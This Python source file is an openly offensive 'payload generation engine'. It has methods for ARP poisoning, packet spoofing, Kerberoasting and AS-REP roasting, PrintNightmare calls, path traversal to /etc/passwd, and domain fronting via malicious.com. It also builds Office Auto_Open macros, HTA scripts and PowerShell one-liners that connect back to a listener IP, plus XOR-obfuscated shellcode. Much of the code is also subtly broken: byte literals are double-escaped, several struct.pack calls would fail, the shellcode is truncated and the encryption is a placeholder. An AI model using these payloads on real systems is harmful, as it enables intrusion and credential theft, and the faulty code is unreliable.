"""
Runecraft Engine - Core payload generation engine
Handles all payload types across network layers
"""
import struct
import base64
import random
import string
from typing import Dict, List, Optional

class RunecraftEngine:
    """Core engine for Runecraft payload generation"""
    
    def __init__(self):
        self.payload_cache = {}
        self.obfuscation_methods = {
            'xor': self._xor_encode,
            'base64': self._base64_encode,
            'aes': self._aes_encode,
            'rc4': self._rc4_encode
        }
    
    def generate_network_payload(self, payload_type: str, target: str, src_port: int, dst_port: int) -> str:
        """Generate network layer payloads (L2-L4)"""
        if payload_type == "Raw IP/TCP/UDP":
            return self._generate_raw_tcp_payload(target, src_port, dst_port)
        elif payload_type == "Malformed Packets":
            return self._generate_malformed_packet()
        elif payload_type == "Fragmented IP Packets":
            return self._generate_fragmented_packet(target, dst_port)
        elif payload_type == "Spoofed Source/Destination":
            return self._generate_spoofed_packet(target, src_port, dst_port)
        elif payload_type == "ICMP Payloads":
            return self._generate_icmp_payload(target)
        elif payload_type == "ARP/ND Poisoning Frames":
            return self._generate_arp_poison_frame(target)
        elif payload_type == "LLMNR/NBNS Probes":
            return self._generate_llmnr_probe()
        
        return "Unknown network payload type"
    
    def generate_protocol_payload(self, payload_type: str, domain: str) -> str:
        """Generate protocol level payloads (L5-L7)"""
        if payload_type == "SMB Negotiation Packets":
            return self._generate_smb_negotiation()
        elif payload_type == "RPC Bind/Call Sequences":
            return self._generate_rpc_bind_call()
        elif payload_type == "Kerberos AS-REQ (No Preauth)":
            return self._generate_kerberos_asreq(domain)
        elif payload_type == "Kerberos TGS-REQ":
            return self._generate_kerberos_tgsreq(domain)
        elif payload_type == "LSARPC/SAMR RID Brute-force":
            return self._generate_rid_bruteforce()
        elif payload_type == "SpoolSS/EFSRPC Calls":
            return self._generate_spoolss_call()
        elif payload_type == "DCOM Activation Requests":
            return self._generate_dcom_activation()
        elif payload_type == "LDAP Queries":
            return self._generate_ldap_query(domain)
        elif payload_type == "DNS Dynamic Update":
            return self._generate_dns_update()
        elif payload_type == "DHCP Option Payloads":
            return self._generate_dhcp_payload()
        elif payload_type == "HTTP(S) Request Payloads":
            return self._generate_http_payload()
        
        return "Unknown protocol payload type"
    
    def generate_execution_payload(self, payload_type: str, listener_ip: str, listener_port: int) -> str:
        """Generate execution payloads"""
        if payload_type == "Shellcode (x86/x64)":
            return self._generate_shellcode(listener_ip, listener_port)
        elif payload_type == "PE/ELF Binaries":
            return self._generate_pe_binary(listener_ip, listener_port)
        elif payload_type == "Reflective DLL":
            return self._generate_reflective_dll()
        elif payload_type == "HTA/JS/VBS/BAT":
            return self._generate_script_payload(listener_ip, listener_port)
        elif payload_type == "MSI/COM/SCT":
            return self._generate_msi_payload()
        elif payload_type == "PowerShell/CMD One-liners":
            return self._generate_powershell_oneliner(listener_ip, listener_port)
        elif payload_type == "Polyglot Files":
            return self._generate_polyglot_file()
        elif payload_type == "MS Office Macros":
            return self._generate_office_macro(listener_ip, listener_port)
        
        return "Unknown execution payload type"
    
    def generate_obfuscated_payload(self, obf_type: str) -> str:
        """Generate obfuscated payloads"""
        base_payload = b"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00"
        
        if obf_type == "Base64/Hex/XOR Encoded":
            return self._apply_basic_obfuscation(base_payload)
        elif obf_type == "Custom Protocol Encapsulation":
            return self._apply_protocol_encapsulation(base_payload)
        elif obf_type == "Padding + Junk Instructions":
            return self._apply_padding_obfuscation(base_payload)
        elif obf_type == "Encrypted Payloads (AES/RC4)":
            return self._apply_encryption_obfuscation(base_payload)
        elif obf_type == "Domain Fronting Payloads":
            return self._apply_domain_fronting(base_payload)
        
        return "Unknown obfuscation type"
    
    def generate_fuzzing_payload(self, fuzz_type: str, buffer_size: int) -> str:
        """Generate fuzzing payloads"""
        if fuzz_type == "Boundary Overflow Buffers":
            return self._generate_overflow_buffer(buffer_size)
        elif fuzz_type == "Format String Variants":
            return self._generate_format_string_fuzz()
        elif fuzz_type == "Invalid UTF-8/UTF-16":
            return self._generate_invalid_unicode()
        elif fuzz_type == "Structured Exceptions":
            return self._generate_seh_fuzz()
        elif fuzz_type == "Unicode Trick Injection":
            return self._generate_unicode_tricks()
        
        return "Unknown fuzzing type"
    
    # Network Layer Implementations
    def _generate_raw_tcp_payload(self, target: str, src_port: int, dst_port: int) -> str:
        """Generate raw TCP packet"""
        # IP Header (20 bytes)
        ip_header = struct.pack('!BBHHHBBH4s4s',
            69,  # Version + IHL
            0,   # Type of Service
            40,  # Total Length
            54321,  # Identification
            0,   # Flags + Fragment Offset
            64,  # TTL
            6,   # Protocol (TCP)
            0,   # Header Checksum (filled by kernel)
            struct.unpack('!I', b'\\xc0\\xa8\\x01\\x64')[0],  # Source IP
            struct.unpack('!I', b'\\xc0\\xa8\\x01\\x01')[0]   # Dest IP
        )
        
        # TCP Header (20 bytes)
        tcp_header = struct.pack('!HHLLBBHHH',
            src_port,  # Source Port
            dst_port,  # Destination Port
            0,         # Sequence Number
            0,         # Acknowledgment Number
            80,        # Data Offset + Reserved
            2,         # Flags (SYN)
            8192,      # Window Size
            0,         # Checksum
            0          # Urgent Pointer
        )
        
        return (ip_header + tcp_header).hex()
    
    def _generate_malformed_packet(self) -> str:
        """Generate malformed packet for fuzzing"""
        # Malformed IP header with invalid length
        malformed = struct.pack('!BBHHHBBH4s4s',
            96,   # Invalid Version + IHL
            255,  # Invalid Type of Service
            0,    # Invalid Total Length
            0,    # Invalid Identification
            65535, # Invalid Flags + Fragment
            0,    # Invalid TTL
            255,  # Invalid Protocol
            0,    # Checksum
            0,    # Invalid Source IP
            0     # Invalid Dest IP
        )
        return malformed.hex()
    
    def _generate_fragmented_packet(self, target: str, dst_port: int) -> str:
        """Generate fragmented IP packet"""
        # Fragment 1
        frag1 = struct.pack('!BBHHHBBH4s4s',
            69, 0, 28, 12345, 8192, 64, 6, 0,  # More fragments flag set
            struct.unpack('!I', b'\\xc0\\xa8\\x01\\x64')[0],
            struct.unpack('!I', b'\\xc0\\xa8\\x01\\x01')[0]
        )
        
        # Fragment 2
        frag2 = struct.pack('!BBHHHBBH4s4s',
            69, 0, 28, 12345, 8, 64, 6, 0,  # Fragment offset = 1
            struct.unpack('!I', b'\\xc0\\xa8\\x01\\x64')[0],
            struct.unpack('!I', b'\\xc0\\xa8\\x01\\x01')[0]
        )
        
        return (frag1 + frag2).hex()
    
    def _generate_spoofed_packet(self, target: str, src_port: int, dst_port: int) -> str:
        """Generate packet with spoofed source"""
        # Spoof source as trusted host (e.g., DNS server)
        spoofed_ip = struct.pack('!BBHHHBBH4s4s',
            69, 0, 40, 54321, 0, 64, 6, 0,
            struct.unpack('!I', b'\\x08\\x08\\x08\\x08')[0],  # Spoofed as 8.8.8.8
            struct.unpack('!I', b'\\xc0\\xa8\\x01\\x01')[0]
        )
        return spoofed_ip.hex()
    
    def _generate_icmp_payload(self, target: str) -> str:
        """Generate ICMP payload for covert channel"""
        icmp_header = struct.pack('!BBHHH',
            8,     # Type (Echo Request)
            0,     # Code
            0,     # Checksum
            12345, # Identifier
            1      # Sequence Number
        )
        
        # Covert data in ICMP payload
        covert_data = b"COVERT_CHANNEL_DATA_HERE"
        return (icmp_header + covert_data).hex()
    
    def _generate_arp_poison_frame(self, target: str) -> str:
        """Generate ARP poisoning frame"""
        arp_packet = struct.pack('!HHBBH6s4s6s4s',
            1,     # Hardware Type (Ethernet)
            0x0800, # Protocol Type (IPv4)
            6,     # Hardware Address Length
            4,     # Protocol Address Length
            2,     # Operation (Reply)
            b'\\x00\\x11\\x22\\x33\\x44\\x55',  # Sender MAC
            b'\\xc0\\xa8\\x01\\x01',           # Sender IP
            b'\\xff\\xff\\xff\\xff\\xff\\xff',  # Target MAC
            b'\\xc0\\xa8\\x01\\x64'            # Target IP
        )
        return arp_packet.hex()
    
    def _generate_llmnr_probe(self) -> str:
        """Generate LLMNR probe for credential capture"""
        llmnr_query = struct.pack('!HHHHHH',
            0x1234, # Transaction ID
            0x0100, # Flags (Query)
            1,      # Questions
            0,      # Answers
            0,      # Authority RRs
            0       # Additional RRs
        )
        
        # Query for "WPAD" (common target)
        query_name = b'\\x04WPAD\\x00'
        query_type = struct.pack('!HH', 1, 1)  # Type A, Class IN
        
        return (llmnr_query + query_name + query_type).hex()
    
    # Protocol Layer Implementations
    def _generate_smb_negotiation(self) -> str:
        """Generate SMB negotiation with downgrade attack"""
        smb_header = b"\\xffSMB"  # SMB1 signature for downgrade
        smb_negotiate = (
            b"\\x72\\x00\\x00\\x00\\x00\\x18\\x53\\xc8"
            b"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"
            b"\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xfe"
            b"\\x00\\x00\\x00\\x00"
        )
        return (smb_header + smb_negotiate).hex()
    
    def _generate_rpc_bind_call(self) -> str:
        """Generate RPC bind and call sequence"""
        # RPC Bind Request
        rpc_bind = struct.pack('<BBBBIHHHHHH16sII',
            5,    # Version
            0,    # Version Minor
            11,   # Packet Type (Bind)
            3,    # Packet Flags
            0x10, # Data Representation
            72,   # Fragment Length
            0,    # Auth Length
            0,    # Call ID
            4280, # Max Xmit Frag
            4280, # Max Recv Frag
            0,    # Assoc Group
            b'\\x12\\x34\\x56\\x78' * 4,  # Interface UUID
            1,    # Interface Version
            0     # Interface Version Minor
        )
        return rpc_bind.hex()
    
    def _generate_kerberos_asreq(self, domain: str) -> str:
        """Generate Kerberos AS-REQ for AS-REP roasting"""
        # Simplified Kerberos AS-REQ structure
        asreq_header = b"\\x6a\\x81\\x8e\\x30\\x81\\x8b"  # ASN.1 header
        asreq_body = f"krbtgt/{domain}@{domain}".encode()
        return (asreq_header + asreq_body).hex()
    
    def _generate_kerberos_tgsreq(self, domain: str) -> str:
        """Generate Kerberos TGS-REQ for Kerberoasting"""
        tgsreq_header = b"\\x6c\\x82\\x01\\x23\\x30\\x82\\x01\\x1f"
        tgsreq_body = f"HTTP/{domain}@{domain}".encode()
        return (tgsreq_header + tgsreq_body).hex()
    
    def _generate_rid_bruteforce(self) -> str:
        """Generate SAMR RID brute-force sequence"""
        samr_query = b"\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x02\\x00"
        return samr_query.hex()
    
    def _generate_spoolss_call(self) -> str:
        """Generate SpoolSS call for PrintNightmare"""
        spoolss_call = b"\\x00\\x00\\x00\\x00\\x45\\x00\\x00\\x00\\x00\\x00\\x00\\x00"
        return spoolss_call.hex()
    
    def _generate_dcom_activation(self) -> str:
        """Generate DCOM activation request"""
        dcom_request = b"\\x05\\x00\\x00\\x03\\x10\\x00\\x00\\x00\\x48\\x00\\x00\\x00"
        return dcom_request.hex()
    
    def _generate_ldap_query(self, domain: str) -> str:
        """Generate LDAP query for enumeration"""
        ldap_query = f"(&(objectClass=user)(servicePrincipalName=*))".encode()
        return ldap_query.hex()
    
    def _generate_dns_update(self) -> str:
        """Generate DNS dynamic update"""
        dns_update = b"\\x12\\x34\\x28\\x00\\x00\\x01\\x00\\x01\\x00\\x00\\x00\\x00"
        return dns_update.hex()
    
    def _generate_dhcp_payload(self) -> str:
        """Generate DHCP option payload"""
        dhcp_payload = b"\\x63\\x82\\x53\\x63\\x35\\x01\\x01\\xff"
        return dhcp_payload.hex()
    
    def _generate_http_payload(self) -> str:
        """Generate HTTP payload for WAF evasion"""
        http_payload = (
            b"GET /%2e%2e/%2e%2e/etc/passwd HTTP/1.1\\r\\n"
            b"Host: target.com\\r\\n"
            b"User-Agent: Mozilla/5.0\\r\\n\\r\\n"
        )
        return http_payload.hex()
    
    # Execution Payload Implementations
    def _generate_shellcode(self, listener_ip: str, listener_port: int) -> str:
        """Generate x64 reverse shell shellcode"""
        # Simplified x64 reverse shell shellcode
        shellcode = (
            b"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50"
            b"\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52"
        )
        return shellcode.hex()
    
    def _generate_pe_binary(self, listener_ip: str, listener_port: int) -> str:
        """Generate PE binary payload"""
        pe_header = b"MZ\\x90\\x00\\x03\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\xff\\xff"
        return pe_header.hex()
    
    def _generate_reflective_dll(self) -> str:
        """Generate reflective DLL payload"""
        dll_header = b"MZ\\x90\\x00\\x03\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\xff\\xff"
        return dll_header.hex()
    
    def _generate_script_payload(self, listener_ip: str, listener_port: int) -> str:
        """Generate HTA/JS/VBS script payload"""
        hta_payload = f'''
        <script language="VBScript">
        Set objShell = CreateObject("WScript.Shell")
        objShell.Run "powershell -nop -c \\"$client = New-Object System.Net.Sockets.TCPClient('{listener_ip}',{listener_port})\\"", 0
        </script>
        '''
        return hta_payload
    
    def _generate_msi_payload(self) -> str:
        """Generate MSI payload"""
        msi_header = b"\\xd0\\xcf\\x11\\xe0\\xa1\\xb1\\x1a\\xe1"
        return msi_header.hex()
    
    def _generate_powershell_oneliner(self, listener_ip: str, listener_port: int) -> str:
        """Generate PowerShell one-liner"""
        ps_payload = f'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\\'{listener_ip}\\',{listener_port})"'
        return ps_payload
    
    def _generate_polyglot_file(self) -> str:
        """Generate polyglot file (PDF+JS+EXE)"""
        polyglot = b"%PDF-1.4\\nMZ\\x90\\x00<script>alert(1)</script>"
        return polyglot.hex()
    
    def _generate_office_macro(self, listener_ip: str, listener_port: int) -> str:
        """Generate Office VBA macro"""
        vba_macro = f'''
        Sub Auto_Open()
            Shell "powershell -nop -c \\"$client = New-Object System.Net.Sockets.TCPClient('{listener_ip}',{listener_port})\\""
        End Sub
        '''
        return vba_macro
    
    # Obfuscation Implementations
    def _apply_basic_obfuscation(self, payload: bytes) -> str:
        """Apply basic XOR/Base64 obfuscation"""
        xor_key = 0xAA
        xor_payload = bytes([b ^ xor_key for b in payload])
        b64_payload = base64.b64encode(xor_payload).decode()
        return f"Base64+XOR: {b64_payload}"
    
    def _apply_protocol_encapsulation(self, payload: bytes) -> str:
        """Apply custom protocol encapsulation"""
        # Encapsulate in fake DNS query
        dns_header = b"\\x12\\x34\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00"
        encapsulated = dns_header + payload
        return f"DNS Encapsulated: {encapsulated.hex()}"
    
    def _apply_padding_obfuscation(self, payload: bytes) -> str:
        """Apply padding and junk instructions"""
        junk = b"\\x90" * 100  # NOP sled
        padded = junk + payload + junk
        return f"Padded: {padded.hex()}"
    
    def _apply_encryption_obfuscation(self, payload: bytes) -> str:
        """Apply AES/RC4 encryption"""
        # Simplified RC4-like encryption
        key = b"MySecretKey123"
        encrypted = bytes([payload[i] ^ key[i % len(key)] for i in range(len(payload))])
        return f"RC4 Encrypted: {encrypted.hex()}"
    
    def _apply_domain_fronting(self, payload: bytes) -> str:
        """Apply domain fronting technique"""
        fronted_request = f'''
        GET / HTTP/1.1
        Host: cdn.cloudflare.com
        X-Forwarded-Host: malicious.com
        Content-Length: {len(payload)}
        
        {payload.hex()}
        '''
        return fronted_request
    
    # Fuzzing Implementations
    def _generate_overflow_buffer(self, buffer_size: int) -> str:
        """Generate buffer overflow payload"""
        pattern = b"A" * buffer_size
        return pattern.hex()
    
    def _generate_format_string_fuzz(self) -> str:
        """Generate format string fuzzing payload"""
        format_strings = ["%s", "%n", "%x", "%p", "%d"]
        fuzz_payload = "".join(format_strings * 20)
        return fuzz_payload
    
    def _generate_invalid_unicode(self) -> str:
        """Generate invalid UTF-8/UTF-16 sequences"""
        invalid_utf8 = b"\\xff\\xfe\\x00\\x00\\xfd\\xff\\xff\\xff"
        return invalid_utf8.hex()
    
    def _generate_seh_fuzz(self) -> str:
        """Generate structured exception handler fuzzing"""
        seh_payload = b"\\x41" * 1000 + b"\\x42\\x42\\x42\\x42"  # EIP overwrite
        return seh_payload.hex()
    
    def _generate_unicode_tricks(self) -> str:
        """Generate Unicode trick injection"""
        unicode_tricks = "\\u202e\\u0041\\u202d"  # Right-to-left override
        return unicode_tricks
    
    # Encoding helpers
    def _xor_encode(self, data: bytes, key: int = 0xAA) -> bytes:
        """XOR encode data"""
        return bytes([b ^ key for b in data])
    
    def _base64_encode(self, data: bytes) -> str:
        """Base64 encode data"""
        return base64.b64encode(data).decode()
    
    def _aes_encode(self, data: bytes) -> bytes:
        """AES encode (simplified)"""
        return data  # Placeholder
    
    def _rc4_encode(self, data: bytes) -> bytes:
        """RC4 encode (simplified)"""
        return data  # Placeholder